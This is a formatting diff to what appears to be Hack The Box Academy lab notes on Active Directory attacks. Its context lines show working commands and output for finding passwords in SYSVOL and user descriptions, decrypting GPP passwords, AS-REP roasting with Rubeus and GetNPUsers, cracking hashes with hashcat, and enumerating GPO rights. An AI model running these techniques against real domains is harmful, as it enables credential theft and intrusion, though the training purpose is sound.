@@ -46,8 +46,7 @@ We can leverage the `Get-SpoolStatus` function from `SecurityAssessment.ps1` (av
 
 #### Enumerating for MS-PRN Printer Bug
 
-```
-        powershell
+```powershell
 PS C:\htb> Import-Module .\SecurityAssessment.ps1
 PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
 
@@ -82,8 +81,7 @@ On the first run of the tool, we can see that some records are blank, namely `?,
 
 #### Using adidnsdump
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
 
 Password: 
@@ -97,8 +95,7 @@ Password:
 
 #### Viewing the Contents of the records.csv File
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ head records.csv 
 
 type,name,value
@@ -117,8 +114,7 @@ If we run again with the `-r` flag the tool will attempt to resolve unknown reco
 
 #### Using the -r Option to Resolve Unknown Records
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
 
 Password: 
@@ -132,8 +128,7 @@ Password:
 
 #### Finding Hidden Records in the records.csv File
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ head records.csv 
 
 type,name,value
@@ -162,8 +157,7 @@ Sensitive information such as account passwords are sometimes found in the user 
 
 #### Finding Passwords in the Description Field using Get-Domain User
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
 
 samaccountname description
@@ -182,8 +176,7 @@ It is possible to come across domain accounts with the [passwd\_notreqd](https:/
 
 #### Checking for PASSWD\_NOTREQD Setting using Get-DomainUser
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
 
 samaccountname                                                         useraccountcontrol
@@ -203,8 +196,7 @@ The SYSVOL share can be a treasure trove of data, especially in large organizati
 
 #### Discovering an Interesting Script
 
-```
-        powershell
+```powershell
 PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
 
     Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
@@ -221,8 +213,7 @@ Taking a closer look at the script, we see that it contains a password for the b
 
 #### Finding a Password in the Script
 
-```
-        powershell
+```powershell
 PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
 
 On Error Resume Next
@@ -270,8 +261,7 @@ If you retrieve the cpassword value more manually, the `gpp-decrypt` utility can
 
 #### Decrypting the Password with gpp-decrypt
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
 
 Password1
@@ -281,8 +271,7 @@ GPP passwords can be located by searching or manually browsing the SYSVOL share 
 
 #### Locating & Retrieving GPP Passwords with CrackMapExec
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ crackmapexec smb -L | grep gpp
 
 [*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
@@ -293,8 +282,7 @@ It is also possible to find passwords in files such as Registry.xml when autolog
 
 #### Using CrackMapExec's gpp\_autologin Module
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
@@ -332,8 +320,7 @@ Below is an example of the attack. PowerView can be used to enumerate users with
 
 #### Enumerating for DONT\_REQ\_PREAUTH Value using Get-DomainUser
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
 
 samaccountname     : mmorgan
@@ -345,8 +332,7 @@ With this information in hand, the Rubeus tool can be leveraged to retrieve the 
 
 #### Retrieving AS-REP in Proper Format using Rubeus
 
-```
-        powershell
+```powershell
 PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
 
    ______        _
@@ -377,8 +363,7 @@ We can then crack the hash offline using Hashcat with mode `18200`.
 
 #### Cracking the Hash Offline with Hashcat
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
 
 hashcat (v6.1.1) starting...
@@ -411,8 +396,7 @@ When performing user enumeration with `Kerbrute`, the tool will automatically re
 
 #### Retrieving the AS-REP Using Kerbrute
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
 
     __             __               __     
@@ -445,8 +429,7 @@ With a list of valid users, we can use [Get-NPUsers.py](https://github.com/Secur
 
 #### Hunting for Users with Kerberos Pre-auth Not Required
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
 Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
 
@@ -488,8 +471,7 @@ Using the [Get-DomainGPO](https://powersploit.readthedocs.io/en/latest/Recon/Get
 
 #### Enumerating GPO Names with PowerView
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-DomainGPO |select displayname
 
 displayname
@@ -515,8 +497,7 @@ This can be helpful for us to begin to see what types of security measures are i
 
 #### Enumerating GPO Names with a Built-In Cmdlet
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-GPO -All | Select DisplayName
 
 DisplayName
@@ -542,8 +523,7 @@ Next, we can check if a user we can control has any rights over a GPO. Specific 
 
 #### Enumerating Domain User GPO Rights
 
-```
-        powershell
+```powershell
 PS C:\htb> $sid=Convert-NameToSid "Domain Users"
 PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
 
@@ -569,8 +549,7 @@ Here we can see that the Domain Users group has various permissions over a GPO, 
 
 #### Converting GPO GUID to Name
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
 
 DisplayName      : Disconnect Idle RDP
